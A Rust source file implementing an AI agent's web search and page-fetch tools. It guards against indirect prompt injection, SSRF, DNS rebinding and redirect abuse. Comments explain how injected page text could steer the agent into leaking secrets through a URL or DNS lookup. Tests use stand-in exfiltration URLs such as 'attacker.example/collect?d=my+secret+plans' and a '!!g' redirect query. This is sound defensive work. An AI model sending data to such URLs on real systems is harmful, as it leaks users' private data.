//! `web_search` / `fetch_url` — the `web-research` subagent's tool set.
//!
//! `web_search` queries the managed SearXNG service the `web-search` plugin
//! already runs (see `plugins/PLUGINS.md` §7); `fetch_url` downloads one page
//! and extracts readable text from it. Both are plain HTTP calls, not
//! sandboxed subprocesses, but `fetch_url`'s target ultimately comes from the
//! model, and indirect prompt injection can steer it. So it opens only a URL
//! the user gave or a search returned (`crate::agent::fetch_allowlist`), at
//! most ten a turn, and `web_search` never follows the search service's
//! redirects. On top of that, every request (and every redirect hop, which
//! is why it has its own non-following client) is blocked from touching a
//! loopback/private/link-local/CGNAT host, mirroring
//! `crate::favicon`'s guard for the identical threat model, plus a DNS-resolve
//! check `favicon` doesn't need (a fetched page's text is echoed straight back
//! into the model's context, so a domain that merely *resolves* to an
//! internal address must be blocked too, not just a literal internal IP).

use super::super::fetch_allowlist::MAX_FETCHES_PER_TURN;
use super::super::tool::{cap_output, ConsentSummary, Tool, ToolContext, ToolError, ToolOutput};
use crate::types::ChatEvent;
use kuchiki::{iter::NodeEdge, NodeData, NodeRef};
use readable_readability::Readability;
use serde_json::Value;
use std::sync::OnceLock;
use std::time::Duration;

const SEARCH_TIMEOUT: Duration = Duration::from_secs(20);
const FETCH_TIMEOUT: Duration = Duration::from_secs(20);
const MAX_REDIRECTS: usize = 5;
const MAX_DOWNLOAD_BYTES: usize = 5_000_000;
const MAX_EXTRACT_CHARS: usize = 20_000;
/// How many ~900-char chunks a reranked excerpt keeps — matches the Python
/// sidecar's default `rerank_top_k`.
const RERANK_TOP_K: usize = 4;
/// How many search hits are surfaced — matches the Python sidecar's default
/// `max_results`.
const MAX_SEARCH_RESULTS: usize = 6;

fn host_is_blocked(host: &str) -> bool {
    let h = host
        .trim_start_matches('[')
        .trim_end_matches(']')
        .to_ascii_lowercase();
    if h.is_empty() || h == "localhost" || h.ends_with(".localhost") {
        return true;
    }
    if let Ok(ip) = h.parse::<std::net::IpAddr>() {
        return ip_blocked(&ip);
    }
    // Not a literal IP: resolve and check every result (DNS-rebinding guard).
    match (h.as_str(), 0).to_socket_addrs() {
        Ok(addrs) => {
            let mut any = false;
            for addr in addrs {
                any = true;
                if ip_blocked(&addr.ip()) {
                    return true;
                }
            }
            !any // couldn't resolve to anything -> fail closed
        }
        Err(_) => true,
    }
}

fn ip_blocked(ip: &std::net::IpAddr) -> bool {
    use std::net::IpAddr;
    match ip {
        IpAddr::V4(v4) => {
            v4.is_loopback()
                || v4.is_private()
                || v4.is_link_local()
                || v4.is_unspecified()
                || v4.is_broadcast()
                || v4.octets()[0] == 0
                || (v4.octets()[0] == 100 && (v4.octets()[1] & 0xc0) == 64)
        }
        IpAddr::V6(v6) => {
            v6.is_loopback()
                || v6.is_unspecified()
                || (v6.segments()[0] & 0xfe00) == 0xfc00
                || (v6.segments()[0] & 0xffc0) == 0xfe80
                || v6
                    .to_ipv4_mapped()
                    .map(|m| ip_blocked(&IpAddr::V4(m)))
                    .unwrap_or(false)
        }
    }
}

fn url_is_blocked(url: &reqwest::Url) -> bool {
    !matches!(url.scheme(), "http" | "https")
        || match url.host_str() {
            Some(h) => host_is_blocked(h),
            None => true,
        }
}

use std::net::ToSocketAddrs;

/// Block-level tags that should force a line break in extracted text — the
/// DOM has no whitespace between e.g. adjacent `<p>`s, so without this a
/// page's paragraphs would run together into one line.
const BLOCK_TAGS: &[&str] = &[
    "p",
    "div",
    "article",
    "section",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "li",
    "br",
    "tr",
    "blockquote",
    "pre",
];

/// Extract a page's main readable content, dropping nav/ads/sidebars/footers
/// via [`readable_readability`]'s port of Mozilla's Readability algorithm
/// (scores DOM subtrees by text/link density rather than a fixed tag
/// denylist), then walk the resulting tree into plain text with paragraph
/// breaks preserved. HTML entities are decoded already by html5ever during
/// parsing, so no separate decoding step is needed.
fn extract_text(html: &str) -> String {
    let (root, _metadata) = Readability::new().parse(html);
    let text = block_text(&root);
    text.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect::<Vec<_>>()
        .join("\n")
}

fn block_text(root: &NodeRef) -> String {
    let mut out = String::with_capacity(1024);
    for edge in root.traverse() {
        match edge {
            NodeEdge::Start(node) => {
                if is_block(&node) && !out.ends_with('\n') {
                    out.push('\n');
                }
                if let NodeData::Text(t) = node.data() {
                    out.push_str(&t.borrow());
                }
            }
            NodeEdge::End(node) => {
                if is_block(&node) && !out.ends_with('\n') {
                    out.push('\n');
                }
            }
        }
    }
    out
}

fn is_block(node: &NodeRef) -> bool {
    node.as_element()
        .is_some_and(|el| BLOCK_TAGS.contains(&el.name.local.as_ref()))
}

/// Pack text into overlapping windows so a subagent can work through a long
/// page a piece at a time without blowing its context: paragraph-aware
/// greedy packing (a paragraph boundary is never split unless the paragraph
/// itself exceeds one window), each chunk after the first prefixed with the
/// tail of the previous one so a fact split across a chunk boundary isn't
/// lost to either half.
const CHUNK_SIZE: usize = 900;
const CHUNK_OVERLAP: usize = 150;

fn chunk_text(text: &str) -> Vec<String> {
    let paragraphs: Vec<&str> = text.split('\n').filter(|p| !p.is_empty()).collect();
    if paragraphs.is_empty() {
        return vec![];
    }

    let mut windows: Vec<String> = Vec::new();
    let mut current = String::new();
    for para in paragraphs {
        for piece in split_oversized(para, CHUNK_SIZE) {
            if !current.is_empty()
                && current.chars().count() + 1 + piece.chars().count() > CHUNK_SIZE
            {
                windows.push(std::mem::take(&mut current));
            }
            if !current.is_empty() {
                current.push('\n');
            }
            current.push_str(piece);
        }
    }
    if !current.is_empty() {
        windows.push(current);
    }

    let mut chunks: Vec<String> = Vec::with_capacity(windows.len());
    for (i, window) in windows.iter().enumerate() {
        if i == 0 {
            chunks.push(window.clone());
            continue;
        }
        let prev = &windows[i - 1];
        let overlap_start = prev
            .char_indices()
            .rev()
            .nth(CHUNK_OVERLAP.saturating_sub(1))
            .map(|(idx, _)| idx)
            .unwrap_or(0);
        let mut chunk = prev[overlap_start..].to_string();
        chunk.push('\n');
        chunk.push_str(window);
        chunks.push(chunk);
    }
    chunks
}

/// Hard-split a paragraph longer than one chunk into `max_len`-char pieces —
/// only reached for pathological input (a page with no paragraph breaks at
/// all), since normal prose paragraphs stay well under [`CHUNK_SIZE`].
fn split_oversized(para: &str, max_len: usize) -> Vec<&str> {
    if para.chars().count() <= max_len {
        return vec![para];
    }
    let mut pieces = Vec::new();
    let mut rest = para;
    while rest.chars().count() > max_len {
        let split_at = rest
            .char_indices()
            .nth(max_len)
            .map(|(idx, _)| idx)
            .unwrap_or(rest.len());
        let (head, tail) = rest.split_at(split_at);
        pieces.push(head);
        rest = tail;
    }
    if !rest.is_empty() {
        pieces.push(rest);
    }
    pieces
}

/// `fetch_url`'s own HTTP client. The app's shared client follows redirects
/// itself (downloads and Hugging Face need that), which would hand
/// [`guarded_get`] the final page without it ever seeing a `3xx` to check —
/// so this one follows none, and `guarded_get` walks every hop.
fn fetch_client() -> Option<&'static reqwest::Client> {
    static CLIENT: OnceLock<Option<reqwest::Client>> = OnceLock::new();
    CLIENT
        .get_or_init(|| {
            reqwest::Client::builder()
                .user_agent(concat!("OpenPal/", env!("CARGO_PKG_VERSION")))
                .connect_timeout(Duration::from_secs(20))
                .redirect(reqwest::redirect::Policy::none())
                .build()
                .ok()
        })
        .as_ref()
}

/// GET `url`, refusing it and every redirect hop that `is_blocked` —
/// [`url_is_blocked`] in production, swapped out by tests that need one
/// local server treated as public and another as internal.
async fn guarded_get(
    client: &reqwest::Client,
    url: &str,
    is_blocked: impl Fn(&reqwest::Url) -> bool,
) -> Result<String, String> {
    let mut current =
        reqwest::Url::parse(url).map_err(|_| "That doesn't look like a valid URL.".to_string())?;
    for _ in 0..=MAX_REDIRECTS {
        if is_blocked(&current) {
            return Err("That address can't be reached from here.".to_string());
        }
        let resp = client
            .get(current.clone())
            .timeout(FETCH_TIMEOUT)
            .send()
            .await
            .map_err(|_| "Couldn't reach that page.".to_string())?;
        if resp.status().is_redirection() {
            let location = resp
                .headers()
                .get(reqwest::header::LOCATION)
                .and_then(|v| v.to_str().ok())
                .ok_or_else(|| "Couldn't follow that page's redirect.".to_string())?;
            current = current
                .join(location)
                .map_err(|_| "Couldn't follow that page's redirect.".to_string())?;
            continue;
        }
        if !resp.status().is_success() {
            return Err(format!("The page returned an error ({}).", resp.status()));
        }
        let bytes = resp
            .bytes()
            .await
            .map_err(|_| "The page's response was cut off.".to_string())?;
        let text =
            String::from_utf8_lossy(&bytes[..bytes.len().min(MAX_DOWNLOAD_BYTES)]).into_owned();
        return Ok(text);
    }
    Err("That page redirected too many times.".to_string())
}

/// `web_search`'s own HTTP client. SearXNG answers an external bang (`!!g`)
/// or a bare `!!` ("feeling lucky") with a redirect to another site carrying
/// the query, so a client that followed it would send the model's query
/// anywhere. This one follows nothing: a redirect comes back as an error
/// status, and the only host a search ever reaches is the local service.
fn search_client() -> Option<&'static reqwest::Client> {
    static CLIENT: OnceLock<Option<reqwest::Client>> = OnceLock::new();
    CLIENT
        .get_or_init(|| {
            reqwest::Client::builder()
                .user_agent(concat!("OpenPal/", env!("CARGO_PKG_VERSION")))
                .connect_timeout(Duration::from_secs(20))
                .redirect(reqwest::redirect::Policy::none())
                .build()
                .ok()
        })
        .as_ref()
}

/// Drop SearXNG's `!` operators from a model-written query: every
/// `!`-prefixed word (`!engine` picks an engine, `!!bang` redirects to an
/// external site, wherever it sits in the query), then any `!` left inside a
/// word, in case a separator Rust and SearXNG disagree on split it there.
/// A search for the user never needs either.
fn strip_search_operators(query: &str) -> String {
    query
        .split_whitespace()
        .filter(|word| !word.starts_with('!'))
        .map(|word| word.replace('!', ""))
        .filter(|word| !word.is_empty())
        .collect::<Vec<_>>()
        .join(" ")
}

/// The query a `web_search` call will actually send, or why it can't.
fn search_query(args: &Value) -> Result<String, ToolError> {
    let query = args
        .get("query")
        .and_then(Value::as_str)
        .ok_or_else(|| ToolError::Rejected("A search needs a \"query\".".to_string()))?;
    let query = strip_search_operators(query);
    if query.is_empty() {
        return Err(ToolError::Rejected(
            "A search needs a \"query\" with words in it.".to_string(),
        ));
    }
    Ok(query)
}

/// Search the web via the managed SearXNG instance. Registered only once its
/// base URL has been resolved (`AgentDeps::search_service_url`), which needs
/// the experimental `web-search` add-on turned on; see
/// `PluginManager::ensure_capability_service`. Takes no client: it always
/// uses [`search_client`], which never follows a redirect.
pub struct WebSearchTool {
    base_url: String,
}

impl WebSearchTool {
    pub fn new(base_url: String) -> Self {
        Self { base_url }
    }
}

#[async_trait::async_trait]
impl Tool for WebSearchTool {
    fn id(&self) -> &str {
        "web_search"
    }

    fn spec(&self) -> Value {
        serde_json::json!({
            "name": "web_search",
            "description": "Search the public web and get back a short list of titles, URLs, and snippets. Use fetch_url on a promising result to read its full text.",
            "parameters": {
                "type": "object",
                "properties": {
                    "query": { "type": "string", "description": "The search query." }
                },
                "required": ["query"]
            }
        })
    }

    fn consent_summary(
        &self,
        args: &Value,
        _ctx: &ToolContext,
    ) -> Result<ConsentSummary, ToolError> {
        let query = search_query(args)?;
        Ok(ConsentSummary {
            summary: format!("Search the web for \"{query}\""),
            detail: query,
            resolved_paths: vec![],
            danger_flags: vec![],
        })
    }

    fn grant_key(&self, args: &Value, _ctx: &ToolContext) -> String {
        format!(
            "web_search:{}",
            args.get("query").and_then(Value::as_str).unwrap_or("")
        )
    }

    // Read-only, and the worst case is "sent a query string to the local
    // search service", which passes it on to the public engines it queries —
    // the request never goes anywhere else, since `search_client` follows no
    // redirect and `search_query` strips the `!!` bangs that would ask for
    // one. Toggling web search on is the user's consent to that (the old
    // Python sidecar never asked per query either).
    fn requires_consent(&self, _args: &Value, _ctx: &ToolContext) -> bool {
        false
    }

    async fn execute(&self, args: &Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
        let query = search_query(args)?;
        let query = query.as_str();

        (ctx.on_event)(ChatEvent::SearchStarted {
            query: query.to_string(),
        });

        let client = search_client().ok_or_else(|| {
            ToolError::ExecutionFailed("Couldn't reach the local search service.".to_string())
        })?;
        let resp = client
            .get(format!("{}/search", self.base_url))
            .query(&[
                ("q", query),
                ("format", "json"),
                ("safesearch", "0"),
                ("language", "en"),
                ("categories", "general"),
            ])
            .timeout(SEARCH_TIMEOUT)
            .header("Accept", "application/json")
            .send()
            .await
            .map_err(|e| {
                ToolError::ExecutionFailed(format!("Couldn't reach the local search service: {e}"))
            })?;

        if !resp.status().is_success() {
            return Err(ToolError::ExecutionFailed(format!(
                "The search service returned HTTP {}.",
                resp.status()
            )));
        }

        let body: Value = resp.json().await.map_err(|_| {
            ToolError::ExecutionFailed("The search service didn't return JSON.".to_string())
        })?;

        let hits = body
            .get("results")
            .and_then(Value::as_array)
            .cloned()
            .unwrap_or_default();

        let mut lines = Vec::new();
        for hit in hits.iter().take(MAX_SEARCH_RESULTS) {
            let title = hit
                .get("title")
                .and_then(Value::as_str)
                .unwrap_or("(untitled)");
            let url = hit.get("url").and_then(Value::as_str).unwrap_or("");
            let snippet = hit.get("content").and_then(Value::as_str).unwrap_or("");
            if url.is_empty() {
                continue;
            }
            ctx.fetch_allowlist.allow_url(url);
            (ctx.on_event)(ChatEvent::SearchResult {
                title: title.to_string(),
                url: url.to_string(),
            });
            let (id, is_new) = ctx.citations.id_for(url);
            if is_new {
                (ctx.on_event)(ChatEvent::Citation {
                    id,
                    url: url.to_string(),
                    title: title.to_string(),
                });
            }
            lines.push(format!("- [{id}] {title}\n  {url}\n  {snippet}"));
        }

        let content = if lines.is_empty() {
            "No results found.".to_string()
        } else {
            lines.join("\n")
        };
        Ok(ToolOutput {
            ok: true,
            preview: format!("{} result(s) for \"{query}\"", lines.len()),
            content: cap_output(content),
        })
    }
}

/// Fetch one URL and return its extracted readable text. Takes no client: it
/// always uses [`fetch_client`], so nobody can hand it one that follows
/// redirects past the per-hop check.
pub struct FetchUrlTool {
    /// [`url_is_blocked`], except in tests that need a loopback listener to
    /// stand in for a public site.
    is_blocked: fn(&reqwest::Url) -> bool,
}

impl FetchUrlTool {
    pub fn new() -> Self {
        Self {
            is_blocked: url_is_blocked,
        }
    }

    /// A `FetchUrlTool` with its internal-network check swapped out — `|_|
    /// false` lets a test serve pages from `127.0.0.1` without touching the
    /// real network.
    #[cfg(test)]
    pub(crate) fn with_block_check(is_blocked: fn(&reqwest::Url) -> bool) -> Self {
        Self { is_blocked }
    }
}

impl Default for FetchUrlTool {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait::async_trait]
impl Tool for FetchUrlTool {
    fn id(&self) -> &str {
        "fetch_url"
    }

    fn spec(&self) -> Value {
        serde_json::json!({
            "name": "fetch_url",
            "description": "Download a web page and return its readable text content. For a long page, pass \"query\" (what you're looking for) to get back only the most relevant excerpts instead of just the page's start.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": { "type": "string", "description": "The page URL to fetch." },
                    "query": {
                        "type": "string",
                        "description": "What you're trying to find on this page — used to pick the most relevant excerpts out of a long page. Omit to just read from the top."
                    }
                },
                "required": ["url"]
            }
        })
    }

    fn consent_summary(
        &self,
        args: &Value,
        ctx: &ToolContext,
    ) -> Result<ConsentSummary, ToolError> {
        let url = args
            .get("url")
            .and_then(Value::as_str)
            .ok_or_else(|| ToolError::Rejected("A fetch needs a \"url\".".to_string()))?;
        let parsed = reqwest::Url::parse(url)
            .map_err(|_| ToolError::Rejected("That doesn't look like a valid URL.".to_string()))?;
        // Both checks below come before `is_blocked`, which resolves the
        // host: a `<secret>.attacker.example` host leaks through DNS alone.
        let host = parsed.host_str().unwrap_or("");
        if !ctx.fetch_allowlist.is_allowed(url) {
            tracing::warn!("fetch_url refused a URL from an untrusted source (host {host})");
            return Err(ToolError::Rejected(
                "You can only open a URL the user gave you or one from web_search results. \
                 Use web_search to find the page first, then fetch a URL exactly as it appears \
                 in the results."
                    .to_string(),
            ));
        }
        if !ctx.fetch_allowlist.take_fetch() {
            tracing::warn!("fetch_url refused past the per-turn budget (host {host})");
            return Err(ToolError::Rejected(format!(
                "You've already read {MAX_FETCHES_PER_TURN} pages this turn. Answer with what \
                 you've found."
            )));
        }
        if (self.is_blocked)(&parsed) {
            return Err(ToolError::Rejected(
                "That address can't be reached from here.".to_string(),
            ));
        }
        Ok(ConsentSummary {
            summary: format!("Read {url}"),
            detail: url.to_string(),
            resolved_paths: vec![],
            danger_flags: vec![],
        })
    }

    fn grant_key(&self, args: &Value, _ctx: &ToolContext) -> String {
        format!(
            "fetch_url:{}",
            args.get("url").and_then(Value::as_str).unwrap_or("")
        )
    }

    // `consent_summary` above already refuses any URL that didn't come from
    // the user or a search result, past the turn's budget, or on an internal
    // host, before this is even reached. What's left is a read-only GET of a
    // page the user effectively picked, so there's nothing to prompt for —
    // and no prompt for the refused ones either: a card asking a beginner to
    // judge an unfamiliar URL would be a worse guard than refusing it.
    fn requires_consent(&self, _args: &Value, _ctx: &ToolContext) -> bool {
        false
    }

    async fn execute(&self, args: &Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
        let url = args
            .get("url")
            .and_then(Value::as_str)
            .ok_or_else(|| ToolError::Rejected("A fetch needs a \"url\".".to_string()))?;
        let query = args.get("query").and_then(Value::as_str);
        (ctx.on_event)(ChatEvent::Fetching {
            url: url.to_string(),
        });
        let client = fetch_client()
            .ok_or_else(|| ToolError::ExecutionFailed("Couldn't reach that page.".to_string()))?;
        let html = guarded_get(client, url, self.is_blocked)
            .await
            .map_err(ToolError::ExecutionFailed)?;
        let text = extract_text(&html);
        if text.trim().is_empty() {
            return Err(ToolError::ExecutionFailed(
                "Couldn't extract any readable text from that page.".to_string(),
            ));
        }
        let (citation_id, is_new) = ctx.citations.id_for(url);
        if is_new {
            (ctx.on_event)(ChatEvent::Citation {
                id: citation_id,
                url: url.to_string(),
                title: url.to_string(),
            });
        }

        let (text, excerpted) = match query {
            Some(q) if text.chars().count() > MAX_EXTRACT_CHARS => {
                let chunks = chunk_text(&text);
                let picked = super::rerank::top_chunks(q, chunks, RERANK_TOP_K);
                (picked.join("\n\n[...]\n\n"), true)
            }
            _ => (text, false),
        };
        let mut text = text;
        if text.chars().count() > MAX_EXTRACT_CHARS {
            text = text.chars().take(MAX_EXTRACT_CHARS).collect();
            text.push_str("\n\n[truncated]");
        }
        if excerpted {
            text = format!(
                "[most relevant excerpts for \"{}\"]\n\n{text}",
                query.unwrap_or_default()
            );
        }
        text = format!("[{citation_id}] {url}\n\n{text}");

        Ok(ToolOutput {
            ok: true,
            preview: format!("Fetched {url}"),
            content: cap_output(text),
        })
    }
}

/// Local HTTP servers for tests that must never touch the real network.
#[cfg(test)]
pub(crate) mod test_server {
    use std::io::{Read, Write};
    use std::sync::{Arc, Mutex};

    /// Serve every request with `respond(path)` (a full raw HTTP response) on
    /// a fresh `127.0.0.1` port. Returns the port and the request targets
    /// (path + query) received so far, in order.
    pub(crate) fn serve(
        respond: impl Fn(&str) -> String + Send + 'static,
    ) -> (u16, Arc<Mutex<Vec<String>>>) {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let requests = Arc::new(Mutex::new(Vec::new()));
        let seen = requests.clone();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { break };
                let mut request = Vec::new();
                let mut buf = [0u8; 1024];
                loop {
                    let n = stream.read(&mut buf).unwrap_or(0);
                    request.extend_from_slice(&buf[..n]);
                    if n == 0 || request.windows(4).any(|w| w == b"\r\n\r\n") {
                        break;
                    }
                }
                let request = String::from_utf8_lossy(&request);
                let target = request.split_whitespace().nth(1).unwrap_or("/").to_string();
                let response = respond(&target);
                seen.lock().unwrap().push(target);
                let _ = stream.write_all(response.as_bytes());
            }
        });
        (port, requests)
    }

    pub(crate) fn ok_page(body: &str) -> String {
        format!(
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        )
    }

    pub(crate) fn redirect_to(location: &str) -> String {
        format!("HTTP/1.1 302 Found\r\nLocation: {location}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agent::consent::ConsentBroker;
    use crate::agent::workspace::WorkspaceJail;
    use std::sync::{atomic::AtomicBool, Arc};

    fn ctx(tmp: &std::path::Path) -> ToolContext {
        ToolContext {
            turn_id: "t".into(),
            call_id: "c1".into(),
            workspace: Arc::new(
                WorkspaceJail::new(
                    tmp,
                    std::path::Path::new("/nonexistent-home"),
                    std::path::Path::new("/nonexistent-data"),
                )
                .unwrap(),
            ),
            scratch_dir: tmp.join(".scratch"),
            cancel: Arc::new(AtomicBool::new(false)),
            on_event: Arc::new(|_| {}),
            citations: Arc::new(crate::agent::CitationRegistry::new()),
            fetch_allowlist: Arc::new(crate::agent::FetchAllowlist::new()),
            consent: Arc::new(ConsentBroker::new(tmp.join("grants.json"))),
        }
    }

    /// The internal-network check resolves the host, so a URL nobody trusted
    /// must be refused before it runs: `<secret>.attacker.example` would leak
    /// through the DNS lookup alone.
    #[test]
    fn an_unknown_url_is_refused_before_its_host_is_resolved() {
        let tmp = tempfile::tempdir().unwrap();
        let tool = FetchUrlTool::with_block_check(|_| {
            panic!("the host of an untrusted URL was looked up")
        });
        let result = tool.consent_summary(
            &serde_json::json!({"url": "https://my-secret-plans.attacker.example/"}),
            &ctx(tmp.path()),
        );
        assert!(
            matches!(result, Err(ToolError::Rejected(reason)) if reason.contains("web_search"))
        );
    }

    /// Collects every log message emitted while it's the thread's default.
    struct CapturedLogs(std::sync::Mutex<Vec<String>>);

    impl tracing::Subscriber for CapturedLogs {
        fn enabled(&self, _: &tracing::Metadata<'_>) -> bool {
            true
        }
        fn new_span(&self, _: &tracing::span::Attributes<'_>) -> tracing::span::Id {
            tracing::span::Id::from_u64(1)
        }
        fn record(&self, _: &tracing::span::Id, _: &tracing::span::Record<'_>) {}
        fn record_follows_from(&self, _: &tracing::span::Id, _: &tracing::span::Id) {}
        fn event(&self, event: &tracing::Event<'_>) {
            struct Message<'a>(&'a mut String);
            impl tracing::field::Visit for Message<'_> {
                fn record_debug(&mut self, _: &tracing::field::Field, value: &dyn std::fmt::Debug) {
                    self.0.push_str(&format!("{value:?}"));
                }
            }
            let mut message = String::new();
            event.record(&mut Message(&mut message));
            self.0.lock().unwrap().push(message);
        }
        fn enter(&self, _: &tracing::span::Id) {}
        fn exit(&self, _: &tracing::span::Id) {}
    }

    #[test]
    fn a_refused_fetch_logs_only_the_host() {
        let tmp = tempfile::tempdir().unwrap();
        let logs = Arc::new(CapturedLogs(std::sync::Mutex::new(Vec::new())));
        tracing::subscriber::with_default(logs.clone(), || {
            // Never resolve anything here, whatever the code under test does.
            let tool = FetchUrlTool::with_block_check(|_| true);
            let _ = tool.consent_summary(
                &serde_json::json!({"url": "https://attacker.example/collect?d=my+secret+plans"}),
                &ctx(tmp.path()),
            );
        });
        let logs = logs.0.lock().unwrap();
        assert!(logs.iter().any(|line| line.contains("attacker.example")));
        assert!(!logs
            .iter()
            .any(|line| line.contains("secret") || line.contains("/collect")));
    }

    #[tokio::test]
    async fn a_search_result_url_becomes_fetchable() {
        let (search, _) = test_server::serve(|_| {
            test_server::ok_page(
                "{\"results\":[{\"title\":\"A\",\"url\":\"https://example.com/a\",\"content\":\"\"}]}",
            )
        });
        let tmp = tempfile::tempdir().unwrap();
        let ctx = ctx(tmp.path());
        assert!(!ctx.fetch_allowlist.is_allowed("https://example.com/a"));

        WebSearchTool::new(format!("http://127.0.0.1:{search}"))
            .execute(&serde_json::json!({"query": "a"}), &ctx)
            .await
            .unwrap();

        assert!(ctx.fetch_allowlist.is_allowed("https://example.com/a"));
    }

    /// SearXNG answers an external bang (`!!g ...`) with a `302` to that
    /// site, query and all. The tool must stop at the redirect, and must not
    /// send the bang in the first place.
    #[tokio::test]
    async fn a_search_service_redirect_is_not_followed() {
        let (elsewhere, elsewhere_requests) =
            test_server::serve(|_| test_server::ok_page("{\"results\":[]}"));
        let (search, search_requests) = test_server::serve(move |_| {
            test_server::redirect_to(&format!("http://127.0.0.1:{elsewhere}/?q=leaked"))
        });
        let tmp = tempfile::tempdir().unwrap();
        let tool = WebSearchTool::new(format!("http://127.0.0.1:{search}"));

        let result = tool
            .execute(
                &serde_json::json!({"query": "!!g my secret plans !ddg"}),
                &ctx(tmp.path()),
            )
            .await;

        assert!(result.is_err(), "a 302 from the search service is an error");
        assert!(elsewhere_requests.lock().unwrap().is_empty());
        let sent = search_requests.lock().unwrap();
        assert_eq!(sent.len(), 1);
        assert!(
            !sent[0].contains("%21"),
            "a `!` operator reached SearXNG: {}",
            sent[0]
        );
        assert!(sent[0].contains("q=my+secret+plans&"));
    }

    #[test]
    fn extract_text_drops_scripts_and_tags() {
        let html = "<html><head><script>evil()</script></head><body><p>Hello <b>world</b></p></body></html>";
        let text = extract_text(html);
        assert!(!text.contains("evil"));
        assert!(text.contains("Hello"));
        assert!(text.contains("world"));
    }

    #[test]
    fn blocks_loopback_and_private_hosts() {
        assert!(host_is_blocked("localhost"));
        assert!(host_is_blocked("127.0.0.1"));
        assert!(host_is_blocked("10.0.0.5"));
        assert!(host_is_blocked("192.168.1.1"));
        assert!(host_is_blocked("169.254.1.1"));
        assert!(host_is_blocked("100.64.0.1"));
    }

    #[test]
    fn allows_public_ip() {
        assert!(!host_is_blocked("93.184.216.34"));
    }

    #[test]
    fn extract_text_drops_nav_header_footer_boilerplate() {
        let html = "<html><body>\
            <nav>Home About Contact</nav>\
            <header>Site Name</header>\
            <article><h1>Article Title</h1>\
            <p>The actual article text goes on for a little while so the \
            readability scorer has enough content to recognize this as the \
            main body rather than falling back to the whole page.</p>\
            <p>A second paragraph makes the article the clear highest-density \
            candidate on the page, which is what the algorithm keys off.</p>\
            </article>\
            <aside>Related links</aside>\
            <footer>Copyright 2024</footer>\
            </body></html>";
        let text = extract_text(html);
        assert!(text.contains("The actual article text"));
        assert!(!text.contains("Home About Contact"));
        assert!(!text.contains("Site Name"));
        assert!(!text.contains("Related links"));
        assert!(!text.contains("Copyright"));
    }

    #[test]
    fn extract_text_decodes_common_entities() {
        let html = "<p>Tom &amp; Jerry &mdash; caf&#233; &ldquo;quoted&rdquo; &lt;tag&gt;</p>";
        let text = extract_text(html);
        assert_eq!(text, "Tom & Jerry — café \u{201c}quoted\u{201d} <tag>");
    }

    #[test]
    fn extract_text_keeps_paragraph_breaks() {
        let html = "<article><p>First paragraph.</p><p>Second paragraph.</p></article>";
        let text = extract_text(html);
        assert_eq!(text, "First paragraph.\nSecond paragraph.");
    }

    #[test]
    fn chunk_text_packs_short_paragraphs_into_one_chunk() {
        let text = "First paragraph.\nSecond paragraph.";
        let chunks = chunk_text(text);
        assert_eq!(
            chunks,
            vec!["First paragraph.\nSecond paragraph.".to_string()]
        );
    }

    #[test]
    fn chunk_text_splits_long_text_with_overlap() {
        let para = "word ".repeat(400); // well over CHUNK_SIZE chars
        let chunks = chunk_text(&para);
        assert!(
            chunks.len() > 1,
            "expected more than one chunk, got {}",
            chunks.len()
        );
        // Each chunk after the first repeats the tail of the previous one.
        let prev_tail: String = chunks[0]
            .chars()
            .rev()
            .take(CHUNK_OVERLAP)
            .collect::<Vec<_>>()
            .into_iter()
            .rev()
            .collect();
        assert!(chunks[1].starts_with(&prev_tail));
    }

    #[test]
    fn chunk_text_of_empty_input_is_empty() {
        assert!(chunk_text("").is_empty());
    }

    #[tokio::test]
    async fn redirect_to_a_blocked_host_is_refused_before_any_request() {
        let (internal, internal_requests) =
            test_server::serve(|_| test_server::ok_page("internal secret"));
        let (public, _) = test_server::serve(move |_| {
            test_server::redirect_to(&format!("http://127.0.0.1:{internal}/"))
        });
        let blocked = move |u: &reqwest::Url| u.port() == Some(internal);

        let client = fetch_client().unwrap();
        let result = guarded_get(client, &format!("http://127.0.0.1:{public}/"), blocked).await;

        assert_eq!(
            result,
            Err("That address can't be reached from here.".to_string())
        );
        assert!(
            internal_requests.lock().unwrap().is_empty(),
            "the redirect target must never be contacted"
        );
    }

    /// `/hop/N` redirects to `/hop/N-1`; `/hop/0` is the page.
    fn hop_server() -> u16 {
        test_server::serve(
            |path| match path.strip_prefix("/hop/").map(str::parse::<usize>) {
                Some(Ok(0)) => test_server::ok_page("landed"),
                Some(Ok(n)) => test_server::redirect_to(&format!("/hop/{}", n - 1)),
                _ => "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n".to_string(),
            },
        )
        .0
    }

    #[tokio::test]
    async fn redirects_between_public_hosts_follow_up_to_the_limit() {
        let port = hop_server();
        let client = fetch_client().unwrap();
        let result = guarded_get(
            client,
            &format!("http://127.0.0.1:{port}/hop/{MAX_REDIRECTS}"),
            |_| false,
        )
        .await;
        assert_eq!(result, Ok("landed".to_string()));
    }

    #[tokio::test]
    async fn one_redirect_past_the_limit_is_refused() {
        let port = hop_server();
        let client = fetch_client().unwrap();
        let result = guarded_get(
            client,
            &format!("http://127.0.0.1:{port}/hop/{}", MAX_REDIRECTS + 1),
            |_| false,
        )
        .await;
        assert_eq!(
            result,
            Err("That page redirected too many times.".to_string())
        );
    }
}
